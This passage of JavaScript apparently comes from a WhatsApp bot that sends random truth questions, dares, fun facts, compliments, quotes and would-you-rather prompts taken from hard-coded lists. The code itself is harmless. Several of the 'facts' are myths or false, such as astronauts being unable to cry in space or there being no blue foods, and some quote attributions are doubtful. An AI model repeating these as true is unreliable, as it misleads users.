            "What’s the most embarrassing thing that’s happened to you in public?",
            "What’s something you’ve done that your parents would disapprove of?",
            "Have you ever stolen something?",
            "What’s a secret you’ve never shared?",
            "What’s your biggest pet peeve?",
            "Who was your first crush?",
            "What’s the worst thing you’ve ever done to someone?",
            "Have you ever been in love?",
            "If you could date anyone in this group, who would it be?",
            "What’s something you’re really insecure about?",
            "What’s the worst date you’ve ever had?",
            "Have you ever had an awkward moment with someone you liked?",
            "What’s the craziest thing you’ve done for love?",
            "Have you ever had a one-night stand?",
            "What’s your worst habit?",
            "What’s your favorite physical feature about yourself?",
            "What’s your most embarrassing childhood memory?",
            "If you could live anywhere in the world, where would it be?",
            "What’s the most embarrassing thing you’ve said to someone?",
            "Have you ever cried in front of someone?",
            "What’s a secret talent you have?",
            "What’s your biggest insecurity?",
            "What’s the worst thing you’ve done at work or school?",
            "What’s the worst advice you’ve ever taken?",
            "Have you ever been caught doing something you shouldn’t?",
            "If you could be famous for something, what would it be?",
            "What’s one thing you’ve always wanted to do but never had the courage to?",
            "Have you ever broken someone’s heart?",
            "What’s the most rebellious thing you’ve done?",
            "Have you ever had a crush on a teacher?",
            "What’s the weirdest dream you’ve ever had?",
            "What’s the most awkward thing you’ve ever done to impress someone?",
            "If you could switch bodies with someone for a day, who would it be?",
            "What’s the worst mistake you’ve made in a relationship?",
            "Have you ever been in a secret relationship?",
            "What’s the worst gift you’ve ever received?",
            "What’s your biggest turn-on?",
            "Have you ever told someone you loved them without meaning it?",
            "What’s the worst job you’ve ever had?",
            "Have you ever lied on your resume?",
            "What’s something you’ve done that made you feel proud?",
            "Have you ever ghosted someone?",
            "What’s the biggest lie you’ve ever told?",
            "What’s one thing you would change about yourself?",
            "If you could have one wish right now, what would it be?",
            "Have you ever been in a physical fight?",
            "What’s the most embarrassing thing that happened to you in school?",
            "What’s something you’ve never told anyone about your childhood?",
            "What’s something you’ve done that your friends don’t know about?",
            "What’s your most awkward family gathering memory?",
            "What’s something you would never do even for a million dollars?",
            "Have you ever been in trouble with the law?",
            "What’s the last thing you searched for on your phone?",
            "Have you ever done something that you regretted instantly?",
            "What’s the worst thing you’ve done at a party?",
            "What’s something you hate about yourself?",
            "Have you ever betrayed a friend?",
            "What’s the weirdest thing you’ve ever eaten?",
            "What’s the most embarrassing thing you’ve done on a date?",
            "If you could change one thing about your personality, what would it be?",
            "Have you ever had a crush on someone you shouldn’t?",
            "What’s something you’ve done that you’d never admit to anyone?",
            "What’s the worst advice you’ve ever given?",
            "What’s the most awkward thing you’ve done in a job interview?",
            "Have you ever been caught cheating on a test?",
            "What’s the most embarrassing thing you’ve done on social media?",
            "What’s the worst thing you’ve done for money?",
            "Have you ever been attracted to someone’s partner?",
            "What’s the craziest thing you’ve ever done on a dare?",
            "Have you ever been rejected by someone you liked?",
            "What’s the worst breakup you’ve ever had?",
            "What’s the worst decision you’ve made in the past year?",
            "Have you ever lied to your best friend?",
            "What’s the most embarrassing thing you’ve done while drunk?",
            "What’s something you’ve done to avoid confrontation?",
            "Have you ever been caught sneaking out?",
            "What’s the worst thing you’ve done in the name of revenge?",
            "Have you ever done something you’re ashamed of in public?",
            "What’s something you’ve been hiding from your family?",
            "What’s the most embarrassing thing you’ve done at work?",
            "Have you ever taken a risk that didn’t pay off?",
            "What’s something you’ve done that you’re proud of but never told anyone?",
            "What’s the weirdest thing you’ve found on the internet?",
            "What’s the most embarrassing text you’ve sent?",
            "What’s the last thing you lied about?",
            "What’s the worst job interview you’ve ever had?",
            "Have you ever been in an awkward situation with someone you didn’t know well?",
            "What’s your most embarrassing online moment?",
            "What’s the most embarrassing thing you’ve done in front of your crush?",
            "What’s your biggest regret in life?",
            "Have you ever made a prank call?",
            "What’s your most embarrassing family moment?",
            "Have you ever been in love with someone who didn’t love you back?"
        ];

        // Send a random truth question directly to the user
        await PhistarBotInc.sendMessage(m.chat, {
            text: `*😳 Truth Time! 😳*\n\n${truthQuestions[Math.floor(Math.random() * truthQuestions.length)]}\n\n*Your turn to be honest! 😅*`
        }, { quoted: m });

    } catch (err) {
        replyphistar('❌ An error occurred while retrieving the truth question. Please try again later.');
        console.error('Truth error:', err);
    }
    break;
    case 'dare':
    try {
        // List of 100 dare challenges
        const dareChallenges = [
            "I dare you to send a funny selfie to the group.",
            "I dare you to try to sing a song and send the voice note.",
            "I dare you to do 10 push-ups and send a video of it.",
            "I dare you to post a random emoji in the chat and leave it there for 10 minutes.",
            "I dare you to tell a funny joke to the group right now.",
            "I dare you to make a funny face and send a photo of it.",
            "I dare you to send a message in a completely different accent for the rest of the chat.",
            "I dare you to share an embarrassing childhood story.",
            "I dare you to share your last search history with the group.",
            "I dare you to send a voice note singing your favorite song.",
            "I dare you to write a funny poem about someone in the group.",
            "I dare you to try a dance move and record it.",
            "I dare you to pretend to be a celebrity for the next 10 minutes.",
            "I dare you to tell the funniest joke you know.",
            "I dare you to post a random video of you dancing to any song.",
            "I dare you to share a weird secret talent you have.",
            "I dare you to make a prank call to someone in the group.",
            "I dare you to try to talk in rhyme for the next 5 minutes.",
            "I dare you to share an embarrassing story from your teenage years.",
            "I dare you to tell the group an embarrassing fact about yourself.",
            "I dare you to do your best impression of someone in the group.",
            "I dare you to act like a robot for the next 5 minutes.",
            "I dare you to do 20 jumping jacks on camera.",
            "I dare you to speak only in questions for the next 5 minutes.",
            "I dare you to share a weird food combination you like.",
            "I dare you to send a voice note singing the alphabet.",
            "I dare you to make a funny face and keep it for 30 seconds.",
            "I dare you to send a video of you making an unusual sound.",
            "I dare you to pretend you are a character from a movie for 5 minutes.",
            "I dare you to do an impression of someone famous and send a video.",
            "I dare you to wear something ridiculous and send a photo of yourself.",
            "I dare you to try a random dance challenge from TikTok.",
            "I dare you to change your profile picture to something funny for 24 hours.",
            "I dare you to post a video of you attempting a backflip.",
            "I dare you to do your best impression of an animal sound.",
            "I dare you to make a funny voice and send a voice note.",
            "I dare you to eat something spicy and record your reaction.",
            "I dare you to wear socks on your hands and take a picture.",
            "I dare you to sing a random song loudly in your room and send a video.",
            "I dare you to draw a silly doodle and share it with the group.",
            "I dare you to take a 10-second video of you jumping up and down.",
            "I dare you to make up a silly song and sing it for the group.",
            "I dare you to act like a famous celebrity for the next 10 minutes.",
            "I dare you to wear your clothes backward for the next hour.",
            "I dare you to take a picture of your messy room and share it.",
            "I dare you to do a cartwheel and record it.",
            "I dare you to try to say the alphabet backwards.",
            "I dare you to put your favorite item of clothing on your head and take a picture.",
            "I dare you to send a video of you eating something sour.",
            "I dare you to post a video of you trying to imitate an animal's walk.",
            "I dare you to send a video of you lip-syncing to a song.",
            "I dare you to dance like a robot for one minute.",
            "I dare you to write a funny tweet and share it on social media.",
            "I dare you to record yourself eating a spoonful of peanut butter.",
            "I dare you to do a slow-motion video of you jumping in the air.",
            "I dare you to try to juggle three objects and film yourself.",
            "I dare you to sing a love song in a funny voice.",
            "I dare you to talk in rhyme for the next five messages.",
            "I dare you to take a photo of your reaction to seeing an animal on TV.",
            "I dare you to put on sunglasses and walk around your house like you're famous.",
            "I dare you to say a tongue twister five times fast without making a mistake.",
            "I dare you to create a new handshake with someone and record it.",
            "I dare you to try to touch your toes while standing for one minute.",
            "I dare you to send a voice message singing the chorus of your favorite song.",
            "I dare you to make a TikTok video of you doing a silly challenge.",
            "I dare you to send a video of you pretending to be a superhero.",
            "I dare you to take a silly selfie with a random object.",
            "I dare you to send a video of you trying to jump rope for one minute.",
            "I dare you to try to walk like a penguin for 30 seconds.",
            "I dare you to try to mimic the sound of a duck.",
            "I dare you to talk to a random person and try to make them laugh.",
            "I dare you to post a funny meme on your story.",
            "I dare you to send a video of you trying a new hairstyle.",
            "I dare you to create a funny, short skit and send it to the group.",
            "I dare you to record yourself acting out a scene from a movie.",
            "I dare you to put on the most ridiculous outfit you have and take a picture.",
            "I dare you to make a funny video and try to get everyone to laugh.",
            "I dare you to share a funny story that happened to you recently.",
            "I dare you to do a dramatic reading of a children’s book.",
            "I dare you to attempt a yoga pose and send a photo.",
            "I dare you to make a short video of you doing your best runway walk.",
            "I dare you to send a voice note singing any song with enthusiasm.",
            "I dare you to record yourself doing a funny dance move.",
            "I dare you to put your clothes on inside out and take a picture.",
            "I dare you to try to make a sandwich blindfolded and send a video of it.",
            "I dare you to act like you're on a cooking show and demonstrate making a simple snack.",
            "I dare you to do 20 sit-ups in a row and record it.",
            "I dare you to talk in a funny accent for the next 10 minutes.",
            "I dare you to write a poem about someone in the group.",
            "I dare you to create a funny TikTok dance and share it.",
            "I dare you to do a dramatic reading of the lyrics to a pop song.",
            "I dare you to send a voice note singing the first verse of your favorite song.",
            "I dare you to wear your clothes in a crazy combination for the next hour.",
            "I dare you to try to do a split and send a video.",
            "I dare you to make up a silly nickname for yourself and introduce yourself with it.",
            "I dare you to send a video of you making a funny face.",
            "I dare you to try a random food combination and film your reaction.",
            "I dare you to take a 5-second video of you jumping around like a kangaroo.",
            "I dare you to act like a famous cartoon character for the next 5 minutes.",
            "I dare you to imitate a famous celebrity’s voice and send a voice note.",
            "I dare you to wear socks on your hands for the next 15 minutes.",
            "I dare you to tell a really cheesy joke to the group.",
            "I dare you to wear a ridiculous wig and take a picture.",
            "I dare you to try to balance an object on your head for one minute."
        ];

        // Send a random dare challenge directly to the user
        await PhistarBotInc.sendMessage(m.chat, {
            text: `*😜 Dare Time! 😜*\n\n${dareChallenges[Math.floor(Math.random() * dareChallenges.length)]}\n\n*Are you up for it?*`
        }, { quoted: m });

    } catch (err) {
        replyphistar('❌ An error occurred while retrieving the dare challenge. Please try again later.');
        console.error('Dare error:', err);
    }
    break;
    case 'fact':
    try {
        // List of 100 random facts
        const facts = [
            "Bananas are berries, but strawberries aren’t.",
            "A group of flamingos is called a 'flamboyance.'",
            "Honey never spoils. Archaeologists have found pots of honey in ancient Egyptian tombs that are over 3,000 years old and still perfectly edible.",
            "Octopuses have three hearts and blue blood.",
            "The Eiffel Tower can be 15 cm taller during the summer due to the expansion of metal in heat.",
            "Wombat poop is cube-shaped.",
            "The shortest commercial flight in the world is between two Scottish islands and lasts only 57 seconds.",
            "A day on Venus is longer than a year on Venus.",
            "Cleopatra lived closer in time to the moon landing than to the construction of the Great Pyramid of Giza.",
            "The longest hiccuping spree lasted 68 years.",
            "You can't hum while holding your nose.",
            "The inventor of the Pringles can is buried in one.",
            "Sharks existed before trees.",
            "Cows have best friends and can become stressed when separated from them.",
            "A single cloud can weigh more than a million pounds.",
            "Bamboo can grow up to 35 inches in a single day.",
            "The heart of a blue whale is the size of a small car.",
            "There are more stars in the universe than grains of sand on all the Earth’s beaches.",
            "A bolt of lightning is five times hotter than the surface of the sun.",
            "Sloths can hold their breath for up to 40 minutes underwater.",
            "The unicorn is Scotland’s national animal.",
            "Polar bear skin is black, although their fur appears white.",
            "Apples are more effective at waking you up in the morning than coffee.",
            "The shortest war in history lasted 38 to 45 minutes between Britain and Zanzibar in 1896.",
            "Hawaii moves 7.5cm closer to Japan every year.",
            "Cows can walk upstairs, but they can’t walk down.",
            "In space, astronauts cannot cry because there is no gravity to make the tears flow.",
            "Venus is the hottest planet in our solar system, even though Mercury is the closest to the Sun.",
            "A crocodile cannot stick its tongue out.",
            "The longest time between two twins being born is 87 days.",
            "Koalas sleep up to 22 hours a day.",
            "Dolphins have names for each other and can call out to each other.",
            "The Great Wall of China is not visible from space with the naked eye.",
            "Banging your head against a wall for one hour burns 150 calories.",
            "The Eiffel Tower can be 15 cm taller during the summer.",
            "An astronaut's height can change by up to 2 inches in space.",
            "The first person to go to space was Yuri Gagarin from the Soviet Union in 1961.",
            "Sharks can live for up to 400 years.",
            "There are no naturally occurring blue foods.",
            "The world’s oldest piece of chewing gum is over 9,000 years old.",
            "Mount Everest grows by about 4 millimeters every year.",
            "A jellyfish is 95% water.",
            "The average person walks the equivalent of three times around the world in a lifetime.",
            "One teaspoon of honey represents the life work of 12 bees.",
            "There are more trees on Earth than there are stars in the Milky Way.",
            "The word 'nerd' was first coined by Dr. Seuss in *If I Ran the Zoo*.",
            "There is a species of jellyfish that is biologically immortal.",
            "A day on Mercury is twice as long as a year on Mercury.",
            "Cheetahs are the fastest land animals and can run up to 60 mph.",
            "A blue whale’s tongue can weigh as much as an elephant.",
            "The first video ever uploaded to YouTube was titled 'Me at the zoo.'",
            "The longest hiccuping spree lasted 68 years.",
            "An ostrich’s eye is bigger than its brain.",
            "A group of owls is called a parliament.",
            "A snail can sleep for three years.",
            "Peanuts are not nuts; they are legumes.",
            "Sloths can take up to a month to digest their food.",
            "There are more fake flamingos in the world than real ones.",
            "The longest place name in the world is in New Zealand and has 85 characters.",
            "A giraffe's neck contains the same number of vertebrae as a human’s neck.",
            "The unicorn is Scotland’s national animal.",
            "An octopus has three hearts and blue blood.",
            "A sneeze can travel as fast as 100 miles per hour.",
            "The human nose can distinguish at least 1 trillion different scents.",
            "There’s a species of fungus called *'Zombie fungus'* that can take control of ants' bodies.",
            "A shrimp's heart is located in its head.",
            "In Japan, there’s a museum dedicated entirely to Ramen noodles.",
            "The longest hiccuping spree lasted for 68 years.",
            "A panda's diet consists of 99% bamboo.",
            "The most commonly used letter in the English language is 'e'.",
            "Bananas are naturally radioactive.",
            "Honey never spoils.",
            "There’s a species of jellyfish that can revert to its youthful state after adulthood.",
            "Venus is the hottest planet in the solar system.",
            "Elephants can hear through their feet.",
            "Astronauts' height changes in space due to the absence of gravity.",
            "A duck's quack doesn't echo.",
            "The longest wedding veil was longer than 63 football fields.",
            "A day on Neptune lasts 16 hours.",
            "The Eiffel Tower was originally intended to be a temporary structure.",
            "Cats have 32 muscles in each ear.",
            "The longest recorded time without sleep is 11 days.",
            "The shortest war in history was between Britain and Zanzibar, lasting only 38 minutes.",
            "There are no words in the dictionary that rhyme with 'orange.'",
            "A day on Mars is only 40 minutes longer than a day on Earth.",
            "The sound of a whip cracking is faster than the speed of sound.",
            "A leap year has 366 days instead of 365.",
            "A sneeze can travel at speeds of up to 100 miles per hour.",
            "One light-year is about 5.88 trillion miles.",
            "A giraffe’s tongue is about 18 inches long.",
            "The human eye can distinguish about 10 million different colors.",
            "A snail can sleep for three years.",
            "The strongest muscle in the human body is the masseter (jaw muscle).",
            "The world’s largest desert is the Antarctic Desert.",
            "You can’t hum while holding your nose.",
            "The longest hiccuping spree lasted for 68 years.",
            "Polar bears have black skin beneath their white fur.",
            "The largest snowflake ever recorded was 15 inches wide.",
            "The moon is moving away from the Earth by about 1.5 inches each year.",
            "The world’s smallest mammal is the bumblebee bat.",
            "The first recorded Olympic Games were held in 776 BC in Greece.",
            "An octopus can change its color to blend into its surroundings.",
            "A frog can freeze itself in winter and thaw out in the spring.",
            "The longest time someone has gone without eating is 382 days.",
            "Caffeine is the most widely used psychoactive drug in the world.",
            "The longest time anyone has held their breath underwater is 24 minutes.",
            "A panda’s thumb is actually an extended wrist bone.",
            "The largest living organism in the world is a fungus in Oregon, covering 2,385 acres."
        ];

        // Send a random fact directly to the user
        await PhistarBotInc.sendMessage(m.chat, {
            text: `*🤯 Fun Fact Time! 🤯*\n\n${facts[Math.floor(Math.random() * facts.length)]}\n\n*Did you learn something new? 🤓*`
        }, { quoted: m });

    } catch (err) {
        replyphistar('❌ An error occurred while retrieving the fact. Please try again later.');
        console.error('Fact error:', err);
    }
    break;
    case 'compliment':
    try {
        const compliments = [
            "You're an amazing person, inside and out!",
            "You have such a beautiful soul!",
            "Your smile is contagious!",
            "You're so smart and creative!",
            "You light up the room whenever you walk in!",
            "You're an absolute joy to be around!",
            "Your energy is so positive!",
            "You're doing great things, keep it up!",
            "You have a heart of gold!",
            "Your kindness makes the world a better place!",
            "You make everything seem so easy!",
            "You're a true inspiration!",
            "The world needs more people like you!",
            "Your laugh is the best sound ever!",
            "You're a natural at everything you do!",
            "You radiate positivity and joy!",
            "You're a shining star!",
            "You have an incredible ability to make people feel good!",
            "Your creativity knows no bounds!",
            "You are a one-of-a-kind gem!",
            "You're an amazing listener!",
            "You have such an infectious enthusiasm!",
            "You're always so thoughtful and considerate!",
            "You're a beautiful person, inside and out!",
            "You have a gift for making everyone feel special!",
            "You're a master at everything you do!",
            "Your personality lights up every room!",
            "You're a true friend and a loyal companion!",
            "You're always so brave and courageous!",
            "You have such a unique and special perspective!",
            "You're one of a kind, and that's awesome!",
            "Your sense of humor is absolutely amazing!",
            "You're such a positive influence on everyone around you!",
            "You're full of incredible ideas!",
            "You have such an infectious energy!",
            "You're a dream to work with!",
            "You have a special way of making others feel at ease!",
            "You're truly a ray of sunshine!",
            "Your intelligence is so impressive!",
            "You're an inspiration to those around you!",
            "You make life so much better just by being in it!",
            "You have such an amazing work ethic!",
            "You brighten up everyone's day!",
            "You're such a hard worker, and it shows!",
            "You're an absolute star in everything you do!",
            "You have the most beautiful heart!",
            "You always know how to make people smile!",
            "You're such a thoughtful and caring person!",
            "You're a great role model!",
            "You have a unique and beautiful perspective on life!",
            "You always brighten up the room with your presence!",
            "You're someone who everyone loves being around!",
            "You have an incredible ability to make others feel special!",
            "You're a true visionary!",
            "Your wisdom is beyond your years!",
            "You're always so encouraging and uplifting!",
            "You're always so patient and understanding!",
            "You have such a beautiful, positive spirit!",
            "You inspire others to be the best version of themselves!",
            "You're so passionate about everything you do!",
            "Your energy is absolutely magnetic!",
            "You're such a great team player!",
            "You make the world a better place just by being you!",
            "Your presence makes everything better!",
            "You are so genuinely kind and caring!",
            "You're such an incredible problem solver!",
            "You're an amazing motivator!",
            "You have such a beautiful mind!",
            "You're so generous with your time and energy!",
            "You have a great sense of style!",
            "You're an absolute joy to be around!",
            "You make everyone feel so comfortable!",
            "You're always so supportive and encouraging!",
            "You're a true leader in every sense of the word!",
            "You're someone that people admire and look up to!",
            "You have such a big heart!",
            "You're always so thoughtful and kind-hearted!",
            "You're truly a gem in this world!",
            "You have a way of making everyone feel important!",
            "You bring so much joy to those around you!",
            "You have a fantastic sense of humor!",
            "You're a natural at making people feel valued!",
            "You're such a great friend!",
            "You have such an amazing soul!",
            "You bring so much positivity into the world!",
            "You're such a great listener and friend!",
            "You have a heart that’s always open to others!",
            "You make every day brighter just by being you!",
            "You have the most wonderful energy!",
            "You make everyone feel so welcome!",
            "You're an amazing person to have around!",
            "You're such a wonderful spirit!",
            "You're always so kind and generous!",
            "You have an incredible ability to make others feel comfortable!",
            "You're a true gem!",
            "You're so kind-hearted and generous!",
            "You're truly one of a kind!",
            "You're the kind of person who makes the world a better place!",
            "You're amazing just the way you are!",
            "You're full of incredible potential!",
            "You have such a magnetic personality!",
            "You're a treasure to be around!",
            "You're always so friendly and approachable!",
            "You make the world more beautiful just by being in it!",
            "You're an absolute gem of a person!",
            "You're always so full of life!",
            "You brighten everyone's day just by being yourself!",
            "You're truly one of the most remarkable people I know!"
        ];

        await PhistarBotInc.sendMessage(m.chat, {
            text: `*💖 Compliment Time! 💖*\n\n${compliments[Math.floor(Math.random() * compliments.length)]}`
        }, { quoted: m });

    } catch (err) {
        replyphistar('❌ An error occurred while retrieving the compliment. Please try again later.');
        console.error('Compliment error:', err);
    }
    break;
    case 'quote':
    try {
        const quotes = [
            "The only way to do great work is to love what you do. – Steve Jobs",
            "Success is not the key to happiness. Happiness is the key to success. – Albert Schweitzer",
            "Don't watch the clock; do what it does. Keep going. – Sam Levenson",
            "The best way to predict the future is to create it. – Abraham Lincoln",
            "Believe you can and you're halfway there. – Theodore Roosevelt",
            "In the middle of every difficulty lies opportunity. – Albert Einstein",
            "What lies behind us and what lies before us are tiny matters compared to what lies within us. – Ralph Waldo Emerson",
            "Do not wait to strike till the iron is hot, but make it hot by striking. – William Butler Yeats",
            "It does not matter how slowly you go as long as you do not stop. – Confucius",
            "The future belongs to those who believe in the beauty of their dreams. – Eleanor Roosevelt",
            "The only way to achieve the impossible is to believe it is possible. – Charles Kingsleigh",
            "Act as if what you do makes a difference. It does. – William James",
            "Success is not final, failure is not fatal: It is the courage to continue that counts. – Winston Churchill",
            "It always seems impossible until it's done. – Nelson Mandela",
            "You miss 100% of the shots you don't take. – Wayne Gretzky",
            "Everything you can imagine is real. – Pablo Picasso",
            "Life is 10% what happens to us and 90% how we react to it. – Charles R. Swindoll",
            "Don’t wait. The time will never be just right. – Napoleon Hill",
            "Your time is limited, so don’t waste it living someone else’s life. – Steve Jobs",
            "To be yourself in a world that is constantly trying to make you something else is the greatest accomplishment. – Ralph Waldo Emerson",
            "The only limit to our realization of tomorrow is our doubts of today. – Franklin D. Roosevelt",
            "Happiness is not something ready-made. It comes from your own actions. – Dalai Lama",
            "The pessimist sees difficulty in every opportunity. The optimist sees opportunity in every difficulty. – Winston Churchill",
            "Do what you can with all you have, wherever you are. – Theodore Roosevelt",
            "It is never too late to be what you might have been. – George Eliot",
            "A journey of a thousand miles begins with a single step. – Lao Tzu",
            "You must be the change you wish to see in the world. – Mahatma Gandhi",
            "Your life does not get better by chance, it gets better by change. – Jim Rohn",
            "We do not remember days, we remember moments. – Cesare Pavese",
            "The harder you work for something, the greater you’ll feel when you achieve it. – Unknown",
            "Dream big and dare to fail. – Norman Vaughan",
            "Don't be afraid to give up the good to go for the great. – John D. Rockefeller",
            "Success is walking from failure to failure with no loss of enthusiasm. – Winston Churchill",
            "Don't watch the clock; do what it does. Keep going. – Sam Levenson",
            "You don’t have to be great to start, but you have to start to be great. – Zig Ziglar",
            "The only way to do great work is to love what you do. – Steve Jobs",
            "If you can dream it, you can do it. – Walt Disney",
            "Everything you can imagine is real. – Pablo Picasso",
            "Life is either a daring adventure or nothing at all. – Helen Keller",
            "The best way to predict the future is to invent it. – Alan Kay",
            "You are never too old to set another goal or to dream a new dream. – C.S. Lewis",
            "I find that the harder I work, the more luck I seem to have. – Thomas Jefferson",
            "Success usually comes to those who are too busy to be looking for it. – Henry David Thoreau",
            "The only person you are destined to become is the person you decide to be. – Ralph Waldo Emerson",
            "You only live once, but if you do it right, once is enough. – Mae West",
            "Success is the sum of small efforts, repeated day in and day out. – Robert Collier",
            "Everything has beauty, but not everyone can see it. – Confucius",
            "To be great is to be misunderstood. – Ralph Waldo Emerson",
            "In the end, we will remember not the words of our enemies, but the silence of our friends. – Martin Luther King Jr.",
            "The journey of a thousand miles begins with one step. – Lao Tzu",
            "Live as if you were to die tomorrow. Learn as if you were to live forever. – Mahatma Gandhi",
            "It does not matter how slowly you go, as long as you do not stop. – Confucius",
            "What you get by achieving your goals is not as important as what you become by achieving your goals. – Zig Ziglar",
            "Believe you can and you're halfway there. – Theodore Roosevelt",
            "The only thing standing between you and your goal is the story you keep telling yourself as to why you can’t achieve it. – Jordan Belfort",
            "It’s not whether you get knocked down, it’s whether you get up. – Vince Lombardi",
            "You are braver than you believe, stronger than you seem, and smarter than you think. – A.A. Milne",
            "Success is not in what you have, but who you are. – Bo Bennett",
            "Life isn’t about finding yourself. Life is about creating yourself. – George Bernard Shaw",
            "If you want to achieve greatness stop asking for permission. – Anonymous",
            "You can't use up creativity. The more you use, the more you have. – Maya Angelou",
            "Everything you’ve ever wanted is on the other side of fear. – George Addair",
            "What we think, we become. – Buddha",
            "I am not a product of my circumstances. I am a product of my decisions. – Stephen Covey",
            "Go confidently in the direction of your dreams. Live the life you have imagined. – Henry David Thoreau",
            "The best revenge is massive success. – Frank Sinatra",
            "There are no shortcuts to any place worth going. – Beverly Sills",
            "Do what you love, and you’ll never work another day in your life. – Confucius",
            "Opportunities don't happen, you create them. – Chris Grosser",
            "The harder you work for something, the greater you’ll feel when you achieve it. – Unknown",
            "If you don’t design your own life plan, chances are you’ll fall into someone else’s plan. – Jim Rohn",
            "Everything you can imagine is real. – Pablo Picasso",
            "Success is not final, failure is not fatal: it is the courage to continue that counts. – Winston Churchill",
            "You must be the change you wish to see in the world. – Mahatma Gandhi",
            "The purpose of life is not to be happy. It is to be useful, to be honorable, to be compassionate, to have it make some difference that you have lived and lived well. – Ralph Waldo Emerson",
            "Don’t stop when you’re tired. Stop when you’re done. – Unknown",
            "Life is what happens when you’re busy making other plans. – John Lennon",
            "You can never cross the ocean until you have the courage to lose sight of the shore. – Christopher Columbus",
            "The best way to predict the future is to create it. – Peter Drucker",
            "The only impossible journey is the one you never begin. – Tony Robbins",
            "If you want to live a happy life, tie it to a goal, not to people or things. – Albert Einstein",
            "Don’t wait for the perfect moment. Take the moment and make it perfect. – Unknown",
            "Happiness depends upon ourselves. – Aristotle",
            "Everything has beauty, but not everyone can see it. – Confucius",
            "Your life does not get better by chance, it gets better by change. – Jim Rohn",
            "The journey of a thousand miles begins with a single step. – Lao Tzu",
            "Don’t let yesterday take up too much of today. – Will Rogers",
            "The secret to getting ahead is getting started. – Mark Twain",
            "Don't be pushed around by the fears in your mind. Be led by the dreams in your heart. – Roy T. Bennett",
            "Life is either a daring adventure or nothing at all. – Helen Keller"
        ];
        
        await PhistarBotInc.sendMessage(m.chat, {
            text: `*💬 Quote of the Day 💬*\n\n${quotes[Math.floor(Math.random() * quotes.length)]}`
        }, { quoted: m });

    } catch (err) {
        replyphistar('❌ An error occurred while retrieving the quote. Please try again later.');
        console.error('Quote error:', err);
    }
    break;
    case 'wouldyourather':
    try {
        const wouldYouRatherQuestions = [
            "Would you rather be able to speak all languages or be able to speak to animals?",
            "Would you rather have the ability to fly or the ability to turn invisible?",
            "Would you rather have a rewind button or a pause button in your life?",
            "Would you rather always have to sing instead of speaking or dance everywhere you go?",
            "Would you rather never be able to use the internet again or never be able to watch TV again?",
            "Would you rather be famous for something good or infamous for something bad?",
            "Would you rather always be 10 minutes late or always be 20 minutes early?",
            "Would you rather have a personal chef or a personal driver?",
            "Would you rather never have to sleep again or never have to eat again?",
            "Would you rather live in a world where there is no war or a world where there is no hunger?",
            "Would you rather be able to talk to animals or be able to read minds?",
            "Would you rather be rich but lonely or poor but surrounded by loved ones?",
            "Would you rather have super strength or super intelligence?",
            "Would you rather be able to time travel or teleport anywhere instantly?",
            "Would you rather have a photographic memory or be able to forget anything at will?",
            "Would you rather live in a house on the beach or in a cabin in the mountains?",
            "Would you rather be able to control the weather or have the ability to control time?",
            "Would you rather live without music or without movies?",
            "Would you rather always be hot or always be cold?",
            "Would you rather fight 100 duck-sized horses or one horse-sized duck?",
            "Would you rather be able to breathe underwater or fly through the sky?",
            "Would you rather have the ability to speak every language or master every instrument?",
            "Would you rather be constantly tired but still productive or full of energy but lazy?",
            "Would you rather be the smartest person in the world or the funniest?",
            "Would you rather be able to talk to your past self or your future self?",
            "Would you rather live without social media or without your phone?",
            "Would you rather be able to see the future or change the past?",
            "Would you rather never get tired or never feel pain?",
            "Would you rather never have to work again or never have to sleep again?",
            "Would you rather have an unlimited supply of food or unlimited entertainment?",
            "Would you rather have no responsibilities or have a lot of responsibilities but all paid for?",
            "Would you rather always know when someone is lying or always get away with lying?",
            "Would you rather have the ability to create new worlds or explore new worlds?",
            "Would you rather live in a utopia or a dystopia?",
            "Would you rather be able to change your appearance at will or read minds?",
            "Would you rather never be able to get sick or never feel sadness?",
            "Would you rather always be surrounded by people or always be alone?",
            "Would you rather never experience failure or never experience success?",
            "Would you rather have a house full of plants or a house full of pets?",
            "Would you rather always have perfect health or be able to recover instantly from injury?",
            "Would you rather be able to predict the weather or predict the future?",
            "Would you rather always know the truth or never know the truth?",
            "Would you rather be in a relationship with your dream partner or have the perfect career?",
            "Would you rather live in a futuristic city or a rustic village?",
            "Would you rather have the power of invincibility or the power to read minds?",
            "Would you rather be famous for something ridiculous or never be famous at all?",
            "Would you rather never have to do chores again or never have to work again?",
            "Would you rather have all the money in the world but no friends or be poor but surrounded by friends?",
            "Would you rather always be able to find the perfect gift for anyone or always be able to make anyone laugh?",
            "Would you rather be able to talk to animals or control the weather?",
            "Would you rather be the most talented person in the world but never recognized, or the least talented but famous?",
            "Would you rather always have perfect hair or perfect skin?",
            "Would you rather have the ability to teleport to any place or be able to talk to anyone in any language?",
            "Would you rather know all the secrets of the universe or know nothing at all?",
            "Would you rather always be happy but not able to do anything or be able to do anything but never be happy?",
            "Would you rather be in a group of friends who are always honest but brutal or friends who are always kind but not truthful?",
            "Would you rather only be able to tell the truth or only be able to lie?",
            "Would you rather always be happy in your job but poor or unhappy in your job but rich?",
            "Would you rather live forever or live a full life but die young?",
            "Would you rather have the ability to talk to anyone or be invisible when you want?",
            "Would you rather have super speed or super agility?",
            "Would you rather never have to cook again or never have to clean again?",
            "Would you rather experience every single feeling in the world or never feel anything again?",
            "Would you rather always get the last word in an argument or always avoid arguments altogether?",
            "Would you rather be able to sing beautifully or play any musical instrument perfectly?",
            "Would you rather always know what to say or always know when to be silent?",
            "Would you rather always have someone to talk to or always have your own space?",
            "Would you rather never have to sleep or never have to eat?",
            "Would you rather have the perfect body or the perfect mind?",
            "Would you rather always have to say what you’re thinking or never be able to express your feelings?",
            "Would you rather have a perfect memory or always be able to learn new things instantly?",
            "Would you rather be able to live on Mars or live underwater?",
            "Would you rather be able to control your dreams or never need to sleep?",
            "Would you rather always win arguments or always be right but no one believes you?",
            "Would you rather be able to control all your emotions or never feel anything?",
            "Would you rather have the ability to change your past mistakes or predict your future mistakes?",
            "Would you rather have your dream job but hate the people you work with or a mediocre job with great colleagues?",
            "Would you rather never have to age or never have to sleep?",
            "Would you rather have a life without any challenges or a life filled with challenges but never feeling lost?",
            "Would you rather experience your ideal day every day or experience something new every day?",
            "Would you rather always know the right thing to do or the right thing to say?",
            "Would you rather be able to remember everything but never forget or forget everything and start fresh?",
            "Would you rather live a comfortable but ordinary life or an extraordinary but difficult life?",
            "Would you rather be able to live anywhere in the world or have any job you desire?",
            "Would you rather have perfect health for the rest of your life or be able to have any skill you desire?",
            "Would you rather live in a world where everyone knows what you're thinking or a world where no one can talk?",
            "Would you rather be able to hear every conversation around you or read everyone’s mind?",
            "Would you rather have the ability to heal others or the ability to stop time?",
